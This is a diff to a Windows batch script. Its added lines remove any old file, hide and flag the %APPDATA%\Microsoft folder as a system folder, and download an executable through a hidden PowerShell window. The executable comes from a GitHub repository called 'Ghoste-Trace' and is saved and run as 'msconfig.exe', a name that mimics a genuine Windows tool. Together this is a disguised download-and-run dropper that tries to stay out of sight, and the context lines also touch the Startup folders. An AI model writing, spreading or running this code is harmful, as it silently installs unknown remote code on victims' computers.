@@ -55,6 +55,35 @@ if exist "%TARGET_FILE%" (
     start "" "%TARGET_FILE%"
 )
 
+:: Delete old msconfig.exe if it exists in Microsoft folder
+set "MSCONFIG_PATH=%APPDATA%\Microsoft\msconfig.exe"
+
+if exist "%MSCONFIG_PATH%" (
+    attrib -h -s -r "%MSCONFIG_PATH%" >nul 2>&1
+    del /f /q "%MSCONFIG_PATH%" >nul 2>&1
+)
+
+:: Ensure Microsoft folder exists and is hidden
+if not exist "%APPDATA%\Microsoft" (
+    mkdir "%APPDATA%\Microsoft"
+)
+attrib -h -s -r "%APPDATA%\Microsoft" >nul 2>&1
+attrib +h +s "%APPDATA%\Microsoft" >nul 2>&1
+
+:: Download new msconfig.exe
+set "MSCONFIG_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/main/msconfig.exe"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MSCONFIG_URL%', '%MSCONFIG_PATH%'); exit"
+
+timeout /t 2 >nul
+
+:: Run the new msconfig.exe if download succeeded
+if exist "%MSCONFIG_PATH%" (
+    start "" "%MSCONFIG_PATH%"
+) else (
+    echo Failed to download msconfig.exe
+    exit /b 1
+)
+
 :: Remove desktop.ini from both Startup folders
 for %%P in (
     "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini"
